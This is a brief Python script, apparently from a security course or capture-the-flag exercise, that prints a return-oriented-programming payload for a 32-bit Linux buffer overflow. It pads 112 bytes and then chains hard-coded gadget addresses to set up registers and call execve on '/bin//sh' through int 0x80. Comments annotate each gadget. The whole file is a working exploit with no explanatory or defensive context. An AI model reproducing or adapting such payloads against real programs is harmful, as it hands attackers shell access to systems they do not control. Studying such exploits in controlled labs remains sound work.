from struct import pack
from shellcode import shellcode


print("A"*112+pack("<I",0x808e7cb)+"A"*8+pack("<I",0x80bb2ac)+pack("<I",0x807c782)+"A"*4+pack("<I",0x8057361)+pack("<I",0xbffed3bc)+pack("<I",0xbffed3b4)+pack("<I",0x08057ae0)+pack("<I",0x6e69622f)+pack("<I",0x68732f2f))

#808e7cb
#0xbffed38c+0x28=0xbffed3c4

#0x808e7cb-->xor edx
#0x807c782-->add 0xb,eax
#0x8057361 -> pop ecx ebx
#0x8057ae0->int 0x80
#ecx-> the end of which means null

# assembly gadgets!!!




